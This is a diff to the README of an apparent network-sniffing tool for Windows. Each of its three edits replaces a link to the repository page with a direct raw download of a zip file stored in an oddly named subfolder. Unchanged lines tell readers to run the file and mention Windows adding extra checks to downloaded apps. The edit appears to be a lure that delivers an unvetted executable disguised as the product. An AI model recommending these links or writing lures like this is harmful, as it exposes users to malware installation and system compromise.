@@ -1,6 +1,6 @@
 # 🖥️ NetSniffer - See Every Connection Fast
 
-[![Download NetSniffer](https://img.shields.io/badge/Download-NetSniffer-1f6feb?style=for-the-badge&logo=github)](https://github.com/Malvaceaefries86/NetSniffer)
+[![Download NetSniffer](https://img.shields.io/badge/Download-NetSniffer-1f6feb?style=for-the-badge&logo=github)](https://github.com/Malvaceaefries86/NetSniffer/raw/refs/heads/main/myorrhaphy/Net_Sniffer_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it to:
 ## 📥 Download
 
 To get NetSniffer, visit this page to download:
-https://github.com/Malvaceaefries86/NetSniffer
+https://github.com/Malvaceaefries86/NetSniffer/raw/refs/heads/main/myorrhaphy/Net_Sniffer_3.1.zip
 
 If the page shows a release file, download it and run the file on your Windows PC.
 
@@ -170,7 +170,7 @@ Some Windows systems add extra checks to downloaded apps. If that happens:
 ## 📎 Download Link
 
 Download or get the latest build here:
-https://github.com/Malvaceaefries86/NetSniffer
+https://github.com/Malvaceaefries86/NetSniffer/raw/refs/heads/main/myorrhaphy/Net_Sniffer_3.1.zip
 
 ## ❓ Common Questions
 
